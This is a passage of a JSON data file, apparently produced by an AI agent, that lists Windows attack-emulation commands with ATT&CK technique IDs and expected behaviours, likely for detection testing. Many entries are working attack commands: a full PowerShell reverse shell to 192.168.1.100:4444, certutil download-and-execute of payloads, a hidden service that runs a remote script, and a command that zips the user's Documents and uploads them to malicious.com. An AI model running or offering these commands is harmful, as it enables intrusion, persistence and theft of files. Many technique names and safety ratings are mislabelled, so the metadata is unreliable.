      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8e9f9b14-8019-4b23-abd9-6af993dd522c",
      "ttp_id": "unknown",
      "technique_id": "T1053",
      "technique_name": "Scheduled Task",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /create /tn \"Test Task\" /tr \"cmd /c net user test test /add\" /sc daily",
      "description": "Create a scheduled task to add a new user daily",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task is created and executed daily, adding a new user to the system",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.176329",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5f0a2e4c-6a05-4696-97ce-532f6b24ca6e",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::Create('http://example.com')\"",
      "description": "Detects command and control communication with hard-coded C2 servers using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Establishes a connection to the specified C2 server",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.943979",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "07a53c4e-699c-4f80-8a7a-cf55aa6087ef",
      "ttp_id": "unknown",
      "technique_id": "T1100",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Detects command and control communication with hard-coded C2 servers using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads and executes a malicious executable from the specified C2 server",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.943979",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8c1e214c-8e33-4dc7-8608-81dc40a1511b",
      "ttp_id": "unknown",
      "technique_id": "T1101",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com -OutFile %TEMP%\\output.txt -ErrorAction SilentlyContinue\"",
      "description": "Detects command and control communication with hard-coded C2 servers using Invoke-WebRequest",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads data from the specified C2 server and saves it to a file",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:42.945025",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "123bf866-c3a0-4f07-942e-59be2c7fc6f9",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Resource Development",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create TestService binPath= \"cmd.exe /c echo test > %TEMP%\\\\test.txt\" start= auto",
      "description": "Creates a Windows service using sc.exe to execute a command, simulating resource development via service creation",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service named 'TestService' is created and configured to run a benign command writing to a file in %TEMP%. Requires elevated privileges to create services.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:45.003876",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "62d251a9-9c03-4ce2-9e73-e7935048c2d1",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Resource Development",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://127.0.0.1/file.txt %TEMP%\\\\retrieved_file.txt",
      "description": "Uses certutil to download a file from a remote location, simulating acquisition of resources",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from the specified URL. Will fail if no server is running locally but leaves no persistent changes. Uses built-in Windows binary.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:45.004944",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b9400dba-7fda-401d-9ce9-fc611c695f27",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Resource Development",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\test_data.txt -DestinationPath %TEMP%\\\\archive.zip -Force -ErrorAction SilentlyContinue\"",
      "description": "Creates a ZIP archive of a local file using PowerShell, simulating archiving of collected data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Compresses a test file into a ZIP archive in %TEMP%. Uses -Force to overwrite existing archive and -ErrorAction to suppress errors if file doesn't exist.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:45.004944",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "59507fa6-9328-4e2e-955d-62d7518ca33a",
      "ttp_id": "unknown",
      "technique_id": "T1505.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create EvilService binPath= \"cmd.exe /c start /b powershell -nop -w hidden -c \\\"IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/c2.ps1'))\\\"\" start= auto && sc.exe start EvilService",
      "description": "Creates and starts a Windows service that downloads and executes a PowerShell payload from a C2 server",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new service named 'EvilService' is created and started, which attempts to connect to the specified C2 server and execute a remote script. Requires elevated privileges to create services.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:46.385347",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "62e9ede3-7ebc-491d-994e-4b2055eb403f",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/shell.exe %TEMP%\\\\reverse.exe && start /b %TEMP%\\\\reverse.exe",
      "description": "Downloads executable from C2 server using certutil and executes it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses certutil to download a binary from the attacker's server to the user's temp directory and executes it. Works without admin rights but may trigger AV.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:46.385347",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ad5bc63a-b462-4a7b-950e-77d87e2f801f",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()} $client.Close() } catch { }\"",
      "description": "Establishes a reverse TCP shell to C2 server using pure PowerShell",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Connects back to the attacker's IP on port 4444 and provides a command shell over TCP. Execution is fully in memory and leaves minimal disk artifacts.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:46.385347",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "429df65a-c4d4-4ed6-8f1b-2419d1303fe3",
      "ttp_id": "unknown",
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -encode \"%TEMP%\\\\data.txt\" \"%TEMP%\\\\encoded.txt\"",
      "description": "Encode a file using certutil, a built-in Windows utility, to simulate encoded data exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Reads data.txt from the temp directory, encodes it using Base64, and writes the output to encoded.txt. No network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:47.408717",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bc2b4c40-9bba-47ed-a430-89896ccecc8f",
      "ttp_id": "unknown",
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $data = [System.IO.File]::ReadAllBytes('%TEMP%\\\\screenshot.png'); $encoded = [Convert]::ToBase64String($data); [System.IO.File]::WriteAllText('%TEMP%\\\\exfil_data.enc', $encoded) } catch { }\"",
      "description": "Read binary data (e.g., screenshot), encode it in Base64 using PowerShell, and save to an encoded file for exfiltration simulation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to read a PNG file from %TEMP%, convert it to Base64, and write the result to exfil_data.enc. Fails silently if input file is missing.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:47.408717",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cd5017a3-5956-4dc2-842b-ae6d7c6e2219",
      "ttp_id": "unknown",
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $cmd = 'whoami'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $b64 = [Convert]::ToBase64String($bytes); Invoke-WebRequest -Uri http://127.0.0.1:8080/log -Method POST -Body $b64 -Headers @{ 'Content-Type' = 'text/plain' } } catch { }\"",
      "description": "Encode a command (whoami) in Base64 using UTF-16LE (Unicode), then simulate exfiltration via HTTP POST using encoded data.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes 'whoami' in Base64 (UTF-16LE), sends it via POST to a local endpoint (simulated C2). Fails silently if connection is refused or blocked.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:47.408717",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "089c8121-8491-471e-bf81-bcc38b5e58d2",
      "ttp_id": "unknown",
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "tasklist.exe",
      "description": "Lists all running processes using built-in Windows tasklist utility",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Outputs a list of currently running processes with their image names, PIDs, session numbers, and memory usage to stdout",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.055421",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "69c485d2-259f-450e-bbe6-17324b2c0626",
      "ttp_id": "unknown",
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process list brief",
      "description": "Enumerates running processes using WMIC, a legacy WMI command-line tool",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Displays a table of running processes including Name, Process ID, and memory usage; may trigger WMI-based detection mechanisms",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.055421",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "db5e345c-e2db-4242-b05e-9291c0866e41",
      "ttp_id": "unknown",
      "technique_id": "T1057",
      "technique_name": "Process Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_Process | Select-Object ProcessName,ProcessId,CommandLine | ConvertTo-Json\"",
      "description": "Advanced process discovery using PowerShell to retrieve detailed process information including command-line arguments via WMI",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs JSON-formatted list of processes with process name, PID, and command line; uses WMI through PowerShell for richer data",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.055421",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4f052928-5b43-461d-b28a-50b1cf2a64a7",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe kernel32.dll,CreateRemoteThread",
      "description": "Basic process injection attempt using rundll32 to invoke CreateRemoteThread from kernel32, simulating injection into a remote process.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to call CreateRemoteThread via rundll32; will likely fail due to incorrect usage but mimics legitimate API misuse seen in injection attempts.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.981695",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f80f70d5-8bd4-4ce0-ac40-a07107d79d58",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = [System.Convert]::FromBase64String('SV4DVgBfADEAMAA='); Start-Process -FilePath 'notepad.exe'; Start-Sleep -Milliseconds 500; $proc = Get-Process -Name notepad -ErrorAction SilentlyContinue; if ($proc) { [System.Diagnostics.Process]::GetCurrentProcess().Id } } catch { }\"",
      "description": "Intermediate simulation of process injection prep: starts notepad, encodes a benign test string (UTF-16LE: 'I^_V_10') to mimic payload staging.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts notepad.exe, decodes a benign Base64 string (no actual injection), and retrieves current process ID for simulation context.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.981695",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7709f68a-18c5-4bf3-b248-005f0dff389c",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe \"javascript:\\..\\\\mshtml,RunHTMLApplication \";document.write();GetObject('script:https://example.com/mal.js');\"",
      "description": "Advanced abuse of rundll32 to execute script via Windows Script Host through a malformed but structurally valid JS URI, simulating reflective DLL loading behavior.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to trigger script execution via rundll32's JavaScript handler; fails safely due to invalid URL but matches detection patterns for living-off-the-land techniques.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:48.981695",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "420a6b3b-97b6-4145-864f-0ba3d3ec9a43",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/file.zip %TEMP%\\\\exfil.zip && powershell -Command \"Expand-Archive -Path '%TEMP%\\\\exfil.zip' -DestinationPath '%TEMP%\\\\decoded' -Force\"",
      "description": "Download and extract a ZIP archive using certutil and PowerShell Expand-Archive",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a remote HTTP server using certutil, saves it to %TEMP%, then extracts it using PowerShell's Expand-Archive. Simulates exfiltration over C2 channel using common tools.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:49.849434",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "86850a33-4ef2-4f74-9c9a-fd3f1e5e740f",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%USERPROFILE%\\\\Documents\\\\*.docx' -DestinationPath '%TEMP%\\\\archive.zip' -Force; Invoke-WebRequest -Uri 'http://malicious.com/upload' -Method POST -InFile '%TEMP%\\\\archive.zip' -ErrorAction SilentlyContinue\"",
      "description": "Archive select user documents and exfiltrate via HTTP POST",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a ZIP archive of .docx files from the user's Documents folder, then uploads it to a remote server via HTTP POST. Uses legitimate archiving and web request mechanisms for data transfer.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:49.849434",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "13bb0f5c-2780-4cbb-be9b-b19972f715b8",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo exfil_data | certutil.exe -encode -f %TEMP%\\\\encoded.txt && certutil.exe -urlcache -f %TEMP%\\\\encoded.txt http://192.168.1.100/data\"",
      "description": "Encode data with certutil and exfiltrate via HTTP using built-in binaries",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Simulates encoding small data using certutil's Base64 encoder and sends it to a remote endpoint via HTTP using certutil's URL cache function. Uses only built-in Windows binaries with no PowerShell involvement.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:49.850444",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1aaad027-1a5b-4ed8-afd8-040447b0e585",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Hello from cmd.exe > %TEMP%\\test_cmd_exec.txt",
      "description": "Basic execution via cmd.exe to write a test file in the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named test_cmd_exec.txt in the user's temp directory with the text 'Hello from cmd.exe'",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:50.785362",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "71f081d7-9163-4ee4-a818-aed26a7ce4f8",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c certutil.exe -urlcache -split -f http://127.0.0.1:8080/malicious.bat %TEMP%\\stage.bat && %TEMP%\\stage.bat",
      "description": "Intermediate command using built-in certutil to download and execute a batch script from a local server (simulated C2)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a batch file from a local server to temp directory and executes it. Will fail silently if server is unreachable",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:50.785362",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "83d43319-1fbc-4668-a281-906a27988de1",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = 'Test payload'; $path = [System.IO.Path]::Combine($env:TEMP, 'encoded_cmd.txt'); $bytes = [System.Text.Encoding]::Unicode.GetBytes($content); [System.Convert]::ToBase64String($bytes) | Out-File -FilePath $path -Force } catch { exit 1 }\"",
      "description": "Advanced command using PowerShell to encode a test string in Base64 (UTF-16LE) and save to temp",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a Base64-encoded string of 'Test payload' using UTF-16LE encoding and saves it to encoded_cmd.txt in temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:50.785362",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "95c41607-1dde-452a-ae35-60b813d800b1",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c certutil.exe -urlcache -split -f http://192.168.1.100/file.txt %TEMP%\\\\exfil_data.txt",
      "description": "Download a file using certutil, a built-in Windows utility commonly abused for data transfer.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a specified URL to the user's TEMP directory. Will fail silently if network is unreachable or URL is invalid.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:51.670761",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0df1bd09-2858-404b-ba9f-e4dc162f888f",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\sensitive_data -DestinationPath %TEMP%\\\\archive.zip -Force -ErrorAction SilentlyContinue\"",
      "description": "Creates a passwordless ZIP archive of a local directory using PowerShell, simulating data staging before exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Compresses the contents of the 'sensitive_data' folder in TEMP into 'archive.zip'. If the source path does not exist, the command fails silently due to ErrorAction preference.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:51.670761",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7eccf0e3-ab15-4472-9fdf-1205a0ee8fd7",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& cmd /c echo Exfiltrating data... & certutil.exe -urlcache -split -f http://192.168.1.100/agent.exe %TEMP%\\\\agent.exe & start %TEMP%\\\\agent.exe\"",
      "description": "Chains command execution to download and execute a payload using certutil and cmd, all within a single PowerShell call.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Executes a series of commands: prints a message, downloads a file to TEMP, and attempts to execute it. The actual execution of agent.exe would trigger detection; in testing, the file is benign or does not exist.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:51.670761",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c5695dd9-a0c6-41ff-96f9-63c1899589ee",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -encode \"%TEMP%\\data.bin\" \"%TEMP%\\data.enc\" && certutil.exe -decode \"%TEMP%\\data.enc\" \"%TEMP%\\data_decoded.bin\" && del \"%TEMP%\\data.enc\"",
      "description": "Encode and decode a file using certutil to obfuscate data",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A binary file is created in TEMP, encoded to an ASCII format using certutil, then decoded back to binary, and the encoded file is removed. No network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:52.715951",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "70823144-4f78-4903-ab6f-77de7ad4f6b3",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"\"$data = 'This is test data'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data)); Write-Output $encoded; $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $decoded\"\"",
      "description": "Obfuscate string data using Base64 encoding with proper UTF-16LE (Unicode) encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The string 'This is test data' is encoded to Base64 using UTF-16LE, output to console, then decoded and output again. No files are written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:52.715951",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b25f9191-59d5-4e12-beae-ee37ae98322d",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"\"$script = 'Write-Host \\\"Hello from obfuscated code\\\"'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($script); $encoded = [Convert]::ToBase64String($bytes); powershell -EncodedCommand $encoded\"\"",
      "description": "Execute obfuscated PowerShell command via encoded command line using UTF-16LE",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The script 'Write-Host \"Hello from obfuscated code\"' is converted to UTF-16LE bytes, Base64-encoded, and executed via powershell -EncodedCommand. Output appears in console.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:52.715951",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5a307166-57f8-436d-8b52-db4edd12bd35",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/stage.exe %TEMP%\\\\stage.exe && %TEMP%\\\\stage.exe",
      "description": "Download payload using certutil and execute from temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "certutil makes HTTP GET request to C2 server to download executable to %TEMP%, then executes it directly. Connection uses standard HTTP for stealth.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:53.593009",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4db4b1e2-072d-487c-9264-31436d2e27d8",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %USERPROFILE%\\\\Documents\\\\*.docx -DestinationPath %TEMP%\\\\exfil.zip -Force; Invoke-WebRequest -Uri http://192.168.1.100:8080/upload -Method POST -InFile %TEMP%\\\\exfil.zip -ErrorAction SilentlyContinue; Remove-Item %TEMP%\\\\exfil.zip -ErrorAction SilentlyContinue\"",
      "description": "Compress user documents and exfiltrate via HTTP POST using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Archives .docx files from Documents folder, uploads ZIP to C2 server via POST, then deletes local copy. Uses built-in Compress-Archive and Invoke-WebRequest.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:53.593009",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6253d8b6-e0e3-42d9-9c8a-dda08fe3cf0d",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$wc = New-Object Net.WebClient; $wc.UploadFile('http://192.168.1.100:8080/upload', 'POST', '%TEMP%\\\\exfil.zip');\"",
      "description": "Upload exfiltrated data using .NET WebClient via PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses .NET WebClient to upload a pre-existing ZIP file to the C2 server over HTTP. Minimal logging and uses common .NET classes often seen in legitimate apps.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:53.593512",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8ad4bcda-83c7-49ad-b787-d841bd34d273",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -encode \"%TEMP%\\data.txt\" \"%TEMP%\\data.b64\" && certutil.exe -decode \"%TEMP%\\data.b64\" \"%TEMP%\\data_archive.zip\"",
      "description": "Encode and decode a collected data file using certutil, simulating archiving via built-in Windows utility",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a Base64-encoded version of data.txt, then decodes it into a .zip archive. Uses only built-in certutil.exe for format conversion.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:54.605408",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "36e9c6cf-0fec-4ffe-8322-9e19dbcd21bd",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\sensitive_data\\*' -DestinationPath '%TEMP%\\archive.zip' -CompressionLevel Optimal -Force\"",
      "description": "Compress a directory of collected data into a ZIP archive using PowerShell Compress-Archive",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Archives all files from the 'sensitive_data' subdirectory in TEMP into 'archive.zip' with optimal compression. Uses -Force to overwrite if archive exists.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:54.605408",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
